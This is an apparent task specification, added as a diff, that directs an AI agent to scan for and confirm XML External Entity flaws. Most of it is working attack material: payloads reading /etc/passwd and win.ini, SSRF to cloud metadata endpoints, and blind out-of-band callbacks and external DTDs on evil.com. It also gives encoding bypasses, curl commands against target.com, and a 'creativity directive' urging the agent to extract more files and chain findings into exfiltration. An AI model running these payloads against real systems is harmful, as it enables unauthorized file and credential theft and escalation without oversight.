@@ -1,0 +1,415 @@
+================================================================================
+TASK 52 — XXE DETECTION SCANNER
+================================================================================
+Covers testing_toolkit.txt Phase 5 Step 16 (Detection)
+Exploitation → Task 53
+
+OBJECTIVE
+─────────
+Identify XML External Entity (XXE) injection points by:
+- Finding endpoints that accept XML input
+- Testing basic XXE payloads (direct vs blind)
+- Identifying XML parsers and their configurations
+- Detecting OOB-only (blind) XXE candidates
+
+================================================================================
+                              INPUT FILES
+================================================================================
+PRIMARY (endpoints to test):
+  outputs/queue_dynamic_endpoints_urls.txt    ← parameterized URLs
+  outputs/api_endpoints_live.txt              ← API endpoints
+  outputs/har/common_data.txt                 ← HAR-extracted requests
+
+SECONDARY (file upload points):
+  outputs/upload_endpoints.txt                ← file upload forms
+  outputs/api_docs_urls.txt                   ← API docs (SOAP/WSDL?)
+
+INTELLIGENCE:
+  outputs/waf_summary.json                    ← WAF detection
+  outputs/nuclei/tech_stack.json              ← tech stack
+
+================================================================================
+                             OUTPUT FILES
+================================================================================
+outputs/xxe/
+├── xxe_vulnerable.json           ← confirmed XXE (direct response)
+├── xxe_blind_candidates.json     ← suspected blind XXE → Task 53
+├── xml_endpoints.txt             ← endpoints accepting XML
+├── soap_endpoints.txt            ← SOAP/WSDL services found
+├── upload_xxe_candidates.txt     ← file uploads to test with XXE
+├── task53_targets.json           ← blind XXE targets for exploitation
+├── scan_log.txt                  ← execution log
+└── checkpoint.json               ← resume state
+
+================================================================================
+                    XML ENDPOINT DISCOVERY
+================================================================================
+
+CONTENT-TYPE INDICATORS (endpoints likely accepting XML):
+─────────────────────────────────────────────────────────
+application/xml
+text/xml
+application/soap+xml
+application/xhtml+xml
+application/rss+xml
+application/atom+xml
+image/svg+xml
+application/saml+xml
+application/xslt+xml
+
+URL PATH INDICATORS:
+────────────────────
+/soap, /wsdl, /xml, /rss, /feed, /atom
+/api/v1/xml, /service, /ws/
+/saml/, /sso/, /metadata
+/.well-known/
+
+FILE UPLOAD TYPES TO TEST:
+──────────────────────────
+.xml          ← Direct XML upload
+.svg          ← SVG images (XML-based)
+.docx/.xlsx   ← Office docs (contain XML)
+.xls          ← Excel (older format, still XML)
+.pptx         ← PowerPoint (contains XML)
+.odt/.ods     ← OpenDocument (XML-based)
+
+================================================================================
+                         XXE DETECTION PAYLOADS
+================================================================================
+
+SECTION 1: BASIC XXE TEST (Direct Response)
+───────────────────────────────────────────
+# Test if XML parsing is enabled and external entities work
+
+# Linux file read
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+
+# Windows file read
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+]>
+<root>&xxe;</root>
+
+# Alternative: /etc/hostname (smaller, less intrusive)
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<root>&xxe;</root>
+
+SECTION 2: XXE WITH PARAMETER ENTITIES
+──────────────────────────────────────
+# If regular entities blocked, try parameter entities
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+  %xxe;
+]>
+<root>test</root>
+
+SECTION 3: XXE VIA SSRF (Internal Network)
+──────────────────────────────────────────
+# Probe internal services via XXE
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
+]>
+<root>&xxe;</root>
+
+# Cloud metadata
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<root>&xxe;</root>
+
+SECTION 4: BLIND XXE DETECTION (OOB)
+────────────────────────────────────
+# When no response visible, use OOB callback
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://YOUR_INTERACTSH.oast.fun/xxe-test">
+]>
+<root>&xxe;</root>
+
+# With DNS exfiltration
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://xxe.YOUR_INTERACTSH.oast.fun">
+]>
+<root>&xxe;</root>
+
+SECTION 5: ERROR-BASED XXE
+──────────────────────────
+# Force error that leaks file contents
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+  %eval;
+  %error;
+]>
+<root>test</root>
+
+SECTION 6: SVG XXE
+──────────────────
+# For SVG file uploads
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <text x="10" y="50">&xxe;</text>
+</svg>
+
+# SVG with OOB callback
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "http://YOUR_INTERACTSH.oast.fun/svg-xxe">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <text x="10" y="50">&xxe;</text>
+</svg>
+
+SECTION 7: SOAP XXE
+───────────────────
+# For SOAP/WSDL services
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <test>&xxe;</test>
+  </soap:Body>
+</soap:Envelope>
+
+================================================================================
+                         BYPASS TECHNIQUES
+================================================================================
+
+ENCODING BYPASSES:
+──────────────────
+# UTF-16 encoding
+<?xml version="1.0" encoding="UTF-16"?>
+
+# UTF-7 encoding
+<?xml version="1.0" encoding="UTF-7"?>
+
+# With BOM
+(add BOM bytes before XML declaration)
+
+ENTITY ENCODING TRICKS:
+───────────────────────
+# Hex encoding in entity
+<!ENTITY xxe SYSTEM "file:///etc/p&#x61;sswd">
+
+# Decimal encoding
+<!ENTITY xxe SYSTEM "file:///etc/p&#97;sswd">
+
+PROTOCOL VARIATIONS:
+────────────────────
+file:///etc/passwd
+file://localhost/etc/passwd
+file://127.0.0.1/etc/passwd
+php://filter/convert.base64-encode/resource=/etc/passwd
+jar:file:///tmp/test.jar!/test.txt
+netdoc:///etc/passwd
+expect://id
+
+PARSER-SPECIFIC BYPASSES:
+─────────────────────────
+# Some parsers need specific DOCTYPE formats
+<!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd">
+<!DOCTYPE foo PUBLIC "-//evil//DTD//EN" "http://evil.com/xxe.dtd">
+
+================================================================================
+                         TOOL COMMANDS
+================================================================================
+
+NUCLEI XXE TEMPLATES:
+─────────────────────
+# Run all XXE templates
+nuclei -l xml_endpoints.txt -t nuclei-templates/http/vulnerabilities/xxe/ -o nuclei_xxe_results.txt
+
+# Specific XXE checks
+nuclei -l targets.txt -tags xxe -o xxe_scan.txt
+
+CURL MANUAL TESTING:
+────────────────────
+# Basic XXE test
+curl -X POST "https://target.com/api/xml" \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+
+# With authentication
+curl -X POST "https://target.com/api/xml" \
+  -H "Content-Type: application/xml" \
+  -H "Authorization: Bearer TOKEN" \
+  -d @xxe_payload.xml
+
+# SOAP request
+curl -X POST "https://target.com/soap/service" \
+  -H "Content-Type: application/soap+xml" \
+  -H "SOAPAction: test" \
+  -d @soap_xxe.xml
+
+FFUF FOR XML ENDPOINT DISCOVERY:
+────────────────────────────────
+# Find XML endpoints
+ffuf -u "https://target.com/FUZZ" \
+  -w wordlist.txt \
+  -mc 200 \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?><test>1</test>' \
+  -o xml_endpoints.json
+
+================================================================================
+                         DETECTION WORKFLOW
+================================================================================
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ STEP 1: Identify XML Endpoints                                              │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ • Analyze HAR files for Content-Type: application/xml                       │
+│ • Scan API docs for SOAP/WSDL references                                    │
+│ • Check for file upload accepting XML/SVG/Office docs                       │
+│ • Run Nuclei with xxe tags for quick wins                                   │
+└─────────────────────────────────────────────────────────────────────────────┘
+                                    ↓
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ STEP 2: Test Basic XXE (Direct Response)                                    │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ • Send file:///etc/passwd payload                                           │
+│ • Check response for file contents                                          │
+│ • If content appears → CONFIRMED XXE                                        │
+│ • If error with filename → Parser processes entities (test more)            │
+│ • If reflected as-is → No XXE, parser escapes entities                      │
+└─────────────────────────────────────────────────────────────────────────────┘
+                                    ↓
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ STEP 3: Test OOB XXE (Blind Detection)                                      │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ • Start Interactsh listener (or reuse from SSRF)                            │
+│ • Send OOB payload with unique identifier                                   │
+│ • Wait for callback (DNS or HTTP)                                           │
+│ • Callback received → BLIND XXE CONFIRMED → Task 53                         │
+└─────────────────────────────────────────────────────────────────────────────┘
+                                    ↓
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ STEP 4: Test SSRF via XXE                                                   │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ • Try internal URLs: http://127.0.0.1, http://localhost                     │
+│ • Try cloud metadata: http://169.254.169.254/                               │
+│ • Different response = internal access possible                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+                                    ↓
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ STEP 5: Output & Feed Task 53                                               │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ • Write xxe_vulnerable.json (direct XXE)                                    │
+│ • Write task53_targets.json (blind XXE for exploitation)                    │
+│ • Write xml_endpoints.txt (all discovered XML endpoints)                    │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+================================================================================
+                     AI AGENT CREATIVITY DIRECTIVE
+================================================================================
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    🧠 YOU ARE AN INTELLIGENT AGENT 🧠                       │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ XXE is about finding XML PARSERS. Think about WHERE XML is processed.       │
+│                                                                             │
+│ DISCOVER XML PROCESSING POINTS:                                             │
+│                                                                             │
+│ 1. OBVIOUS: API endpoints with Content-Type: application/xml                │
+│ 2. HIDDEN: Endpoints that ACCEPT XML even if not advertised                 │
+│    - Try sending XML to JSON endpoints (some parsers auto-detect)           │
+│    - Change Content-Type header and observe behavior                        │
+│                                                                             │
+│ 3. FILE UPLOADS: Any upload that processes the file server-side             │
+│    - Image uploads (SVG is XML!)                                            │
+│    - Document uploads (DOCX/XLSX contain XML inside)                        │
+│    - Import features (often parse XML/CSV)                                  │
+│                                                                             │
+│ 4. SOAP/WSDL: Legacy services often vulnerable                              │
+│    - Look for /soap, /ws/, /service endpoints                               │
+│    - Check WSDL files for service definitions                               │
+│                                                                             │
+│ OBSERVE AND ADAPT:                                                          │
+│                                                                             │
+│ • Response shows file content? → Direct XXE, extract more files             │
+│ • Error shows file path? → Parser tries to read, may leak via error         │
+│ • No visible output? → Try OOB with Interactsh                              │
+│ • OOB callback received? → Blind XXE confirmed, use external DTD            │
+│                                                                             │
+│ THINK ABOUT THE PARSER:                                                     │
+│                                                                             │
+│ • Java (DocumentBuilder) → Often vulnerable by default                      │
+│ • PHP (SimpleXML, DOMDocument) → Check libxml version                       │
+│ • Python (lxml, xml.etree) → Depends on configuration                       │
+│ • .NET (XmlReader) → Usually secure by default, but check                   │
+│                                                                             │
+│ Error messages often REVEAL the parser - read them carefully!               │
+│                                                                             │
+│ CHAIN FINDINGS:                                                             │
+│ • XXE → File read → Source code → More vulnerabilities                      │
+│ • XXE → SSRF → Internal services → Cloud metadata                           │
+│ • XXE → Error-based → Data exfiltration via error messages                  │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+CONTENT-TYPE MANIPULATION:
+──────────────────────────
+Try these Content-Type headers on endpoints that DON'T advertise XML:
+
+Content-Type: application/xml
+Content-Type: text/xml
+Content-Type: application/xml; charset=utf-8
+Content-Type: text/xml; charset=utf-8
+
+If endpoint normally takes JSON:
+- Keep JSON structure but wrap in XML
+- Or just send raw XML and see if parser accepts
+
+================================================================================
+                              CHECKPOINT/RESUME
+================================================================================
+checkpoint.json format:
+{
+  "last_target_index": 50,
+  "xml_endpoints_found": 12,
+  "xxe_confirmed": 2,
+  "blind_candidates": 5,
+  "interactsh_subdomain": "abc123.oast.fun",
+  "timestamp": "2026-01-13T10:30:00Z"
+}
+
+================================================================================
+                             9-MINUTE BATCHING
+================================================================================
+- Process 50 endpoints per batch (XXE testing is relatively fast)
+- Check Interactsh for OOB callbacks after each batch
+- Write outputs after each batch
+- Checkpoint every batch
+- Total timeout: 8 minutes active + 1 minute output
+
+================================================================================
+                                  NOTES
+================================================================================
+- Start Interactsh FIRST (reuse from SSRF/Task 50 if running)
+- Direct XXE is rare now - most findings are BLIND
+- Blind XXE requires external DTD server → Task 53
+- SVG uploads are often overlooked but frequently vulnerable
+- Office document XXE (DOCX/XLSX) requires file crafting → Task 53
+- Error messages are GOLD - they reveal parser and configuration
+================================================================================
